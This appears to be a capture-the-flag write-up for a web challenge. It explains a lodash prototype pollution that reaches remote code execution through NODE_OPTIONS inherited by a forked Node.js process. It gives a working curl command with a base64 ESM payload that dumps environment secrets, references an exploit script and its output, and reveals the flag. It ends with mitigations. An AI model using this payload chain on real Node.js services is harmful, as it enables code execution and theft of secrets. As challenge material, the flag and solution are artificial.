# Utopia City Old Portal - Web Challenge

## Challenge Information
- **Name**: Utopia City Old Portal
- **Category**: Web
- **Difficulty**: Easy
- **Points**: 500
- **Solves**: 0
- **Instance**: https://65e68d7b042473c7.chal.ctf.ae
- **Flag**: `flag{fa01e9a1ee692637}`

## Challenge Description

Utopia City has deployed a government portal for citizens to contact city officials and access services. The portal allows users to submit contact forms with configurable options.

## Quick Start

### Run the exploit:
```bash
python3 exploit.py https://65e68d7b042473c7.chal.ctf.ae
```

### Manual exploitation:
```bash
# Send pollution payload
curl -X POST "https://65e68d7b042473c7.chal.ctf.ae/api/contact" \
  -H 'Content-Type: application/json' \
  --data '{
    "name":"x",
    "email":"x@x",
    "message":"x",
    "department":"general",
    "config":{
      "__proto__.NODE_OPTIONS":"--import data:text/javascript;base64,aW1wb3J0IHsgd3JpdGVGaWxlU3luYyB9IGZyb20gJ25vZGU6ZnMnOyBpbXBvcnQgeyBlbnYgfSBmcm9tICdub2RlOnByb2Nlc3MnOyB3cml0ZUZpbGVTeW5jKCcvYXBwL3B1YmxpYy9wcF9wcm90by50eHQnLCAoZW52LkZMQUcgfHwgZW52LmZsYWcgfHwgJycpKTs="
    }
  }'

# Wait for child process
sleep 2

# Get flag
curl "https://65e68d7b042473c7.chal.ctf.ae/pp_proto.txt"
```

## Vulnerability Summary

This challenge exploits a **Prototype Pollution** vulnerability in lodash 4.17.15 that leads to **Remote Code Execution (RCE)** through Node.js environment variable manipulation.

## Initial Reconnaissance

Upon accessing the portal, we see a typical government website with:
- Home page listing city officials
- Services page describing available government services
- Contact form for submitting inquiries

The contact form accepts:
- Name
- Email
- Message
- Department selection
- Configuration options (interesting!)

## Source Code Analysis

### Dependencies

```javascript
const express = require('express');
const _ = require('lodash');
const { fork } = require('child_process');
```

Notable: The application uses **lodash** for object manipulation and **child_process.fork** for spawning processes.

### Vulnerable Endpoint

The `/api/contact` POST endpoint contains the vulnerability in `src/app.js`:

```javascript
app.post('/api/contact', (req, res) => {
    const config = {
        department: 'general',
        priority: 'normal',
        autoReply: true,
        notification: {
            email: true,
            sms: false
        }
    };

    // VULNERABLE: User-controlled keys passed to lodash.set
    Object.keys(req.body.config).forEach(key => {
        _.set(config, key, req.body.config[key]);
    });

    // ... response ...

    // SINK: Fork spawns child process
    const scriptPath = path.join(__dirname, 'temp_process.js');
    const scriptContent = `
        console.log('Processing government contact submission...');
        console.log('Ticket ID: ${new Date().getTime()}');
        process.exit(0);
    `;
    fs.writeFileSync(scriptPath, scriptContent);
    const child = fork(scriptPath);  // Inherits polluted environment
});
```

### Package Versions

From `package.json`:
```json
{
  "dependencies": {
    "lodash": "4.17.15",  // Vulnerable version!
    "express": "4.18.2"
  }
}
```

## Root Cause Analysis

### 1. Prototype Pollution via lodash.set

**The Problem:**
- The application uses `lodash.set()` version 4.17.15 (vulnerable to prototype pollution)
- User-controlled keys from `req.body.config` are passed directly to `_.set()`
- lodash.set accepts "path" keys like `"__proto__.NODE_OPTIONS"`
- This allows attackers to pollute `Object.prototype`

### 2. The Sink: child_process.fork

After processing the contact form, the application spawns a child process:

**Why This Matters:**
- `child_process.fork()` spawns a new Node.js process
- The child process inherits environment variables and options
- When `Object.prototype` is polluted with `NODE_OPTIONS`, the child process picks it up
- Node.js honors the `NODE_OPTIONS` environment variable at startup

### 3. Exploitation via NODE_OPTIONS

Node.js supports the `NODE_OPTIONS` environment variable to pass CLI options. Modern Node.js versions support:

```
NODE_OPTIONS="--import data:text/javascript;base64,<base64_encoded_esm>"
```

This tells Node to import an ESM module from a data URL before running the main script.

## Exploitation Strategy

### Step 1: Craft the Payload

Create an ESM module that writes the flag to a publicly accessible file:

```javascript
import { writeFileSync } from 'node:fs';
import { env } from 'node:process';
writeFileSync('/app/public/pp_proto.txt', (env.FLAG || env.flag || ''));
```

Base64 encode this payload:
```
aW1wb3J0IHsgd3JpdGVGaWxlU3luYyB9IGZyb20gJ25vZGU6ZnMnOyBpbXBvcnQgeyBlbnYgfSBmcm9tICdub2RlOnByb2Nlc3MnOyB3cml0ZUZpbGVTeW5jKCcvYXBwL3B1YmxpYy9wcF9wcm90by50eHQnLCAoZW52LkZMQUcgfHwgZW52LmZsYWcgfHwgJycpKTs=
```

### Step 2: Send Prototype Pollution Payload

**CRITICAL DETAIL:** Use a dotted path key, not a nested object:

✅ **This works**:
```json
{
  "config": {
    "__proto__.NODE_OPTIONS": "value"
  }
}
```

❌ **This often fails**:
```json
{
  "config": {
    "__proto__": {
      "NODE_OPTIONS": "value"
    }
  }
}
```

**Why the dotted key works:**
- `"__proto__.NODE_OPTIONS"` is treated as a path by lodash.set
- lodash traverses into the prototype chain and assigns the value
- This pollutes `Object.prototype.NODE_OPTIONS`

### Step 3: Trigger the Fork

The application automatically calls `fork()` after responding, which:
1. Creates a new Node.js process
2. The child process reads the polluted `NODE_OPTIONS` from `Object.prototype`
3. Node.js executes `--import data:text/javascript;base64,...` before running the script
4. Our ESM module executes and writes `process.env.FLAG` to `/app/public/pp_proto.txt`

### Step 4: Retrieve the Flag

Simply fetch the publicly accessible file:
```bash
curl https://65e68d7b042473c7.chal.ctf.ae/pp_proto.txt
```

## Exploit Execution

```bash
$ python3 exploit.py https://65e68d7b042473c7.chal.ctf.ae

======================================================================
Utopia City Old Portal - Prototype Pollution RCE Exploit
======================================================================
[*] Target: https://65e68d7b042473c7.chal.ctf.ae
[*] Creating payload...
[*] Sending prototype pollution payload...
[*] Response status: 200
[*] Waiting for forked process to execute...
[*] Fetching flag from /pp_proto.txt...

[+] SUCCESS! Flag found: flag{fa01e9a1ee692637}
```

## Why This Works

### The Complete Chain

1. **Prototype Pollution**: `"__proto__.NODE_OPTIONS"` pollutes `Object.prototype`
2. **Property Enumeration**: When `fork()` builds the child environment, it enumerates object properties
3. **Prototype Inheritance**: The polluted `NODE_OPTIONS` is found on `Object.prototype`
4. **Node.js Startup**: The child process starts with our malicious `NODE_OPTIONS`
5. **ESM Import**: Node.js executes `--import data:...` before the main script
6. **Code Execution**: Our ESM module runs with full privileges
7. **Flag Exfiltration**: The module writes `process.env.FLAG` to a public file
8. **Retrieval**: We fetch the flag via HTTP

## Why Earlier Attempts Failed

1. **Nested Object Approach**: Using `{"config":{"__proto__":{...}}}` often only replaces the prototype reference on that single object or sets non-enumerable properties not copied the way Node expects.

2. **/proc/self/environ and /proc/self/cmdline**: These tricks depend on platform/container behavior and exact Node parsing; they can be blocked or inconsistent.

3. **Other NODE_OPTIONS vectors**: While `--require` could work, the `--import data:` approach is simpler and more robust on modern Node.js LTS versions.

## Key Takeaways

### For CTF Players

1. **Prototype Pollution ≠ Just XSS**: Can lead to RCE in Node.js environments
2. **Check Package Versions**: Old lodash versions are commonly vulnerable
3. **Look for Sinks**: `child_process`, `eval`, template engines, etc.
4. **NODE_OPTIONS is Powerful**: Can inject code via `--import`, `--require`, `--inspect`
5. **Path Keys Matter**: Dotted keys like `"__proto__.X"` behave differently than nested objects

### For Developers

1. **Never Trust User Input**: Validate/sanitize all keys before using with `_.set()`
2. **Upgrade Dependencies**: Use lodash >= 4.17.21 (but still validate!)
3. **Whitelist Keys**: Only allow expected configuration keys
4. **Clean Child Environments**: Use `Object.create(null)` or explicit env objects
5. **Freeze Prototypes**: Consider `Object.freeze(Object.prototype)` for sensitive apps
6. **Defense in Depth**: Multiple layers prevent single-point failures

## Mitigations

### For Developers

1. **Validate/Whitelist Keys**: Reject keys containing `__proto__`, `prototype`, `constructor`, or dot-path segments:
```javascript
const BLOCKED_KEYS = ['__proto__', 'prototype', 'constructor'];
Object.keys(req.body.config).forEach(key => {
    if (BLOCKED_KEYS.some(blocked => key.includes(blocked))) {
        throw new Error('Invalid key');
    }
    _.set(config, key, req.body.config[key]);
});
```

2. **Upgrade lodash**: Use lodash >= 4.17.21 (though still validate keys)

3. **Clean Environment for Child Processes**: Only pass own properties:
```javascript
const cleanEnv = Object.fromEntries(Object.entries(process.env));
fork(script, { env: cleanEnv });
```

4. **Avoid NODE_OPTIONS Inheritance**: Explicitly control execArgv/env for children

5. **Freeze Prototype** (with caution):
```javascript
Object.freeze(Object.prototype);
```

6. **Use Object.create(null)**: For config objects that shouldn't inherit from Object.prototype:
```javascript
const config = Object.create(null);
```

## Files

- **`exploit.py`** - Automated exploitation script
- **`src/`** - Challenge source code
- **`docker-compose.yml`** - Docker setup
- **`public.zip`** - Challenge distribution

## Technical Details

### Package Versions
- **lodash**: 4.17.15 (vulnerable)
- **express**: 4.18.2
- **Node.js**: Modern LTS (supports --import data: URLs)

### Key Concepts

1. **Prototype Pollution**: Modifying `Object.prototype` affects all objects in the JavaScript runtime
2. **lodash.set Path Traversal**: Dotted keys like `"a.b.c"` traverse nested properties
3. **NODE_OPTIONS**: Environment variable that Node.js reads at process startup
4. **ESM Data URLs**: Modern Node.js can import ES modules from data: URLs
5. **child_process.fork**: Spawns new Node.js processes that inherit environment

## References

- [Prototype Pollution in lodash](https://github.com/lodash/lodash/pull/4874)
- [Node.js NODE_OPTIONS Documentation](https://nodejs.org/api/cli.html#node_optionsoptions)
- [ESM Data URL Imports](https://nodejs.org/api/esm.html#data-imports)
- [Prototype Pollution to RCE](https://blog.sonarsource.com/blasting-node-js-and-javascript-with-prototype-pollution)

## Flag

```
flag{fa01e9a1ee692637}
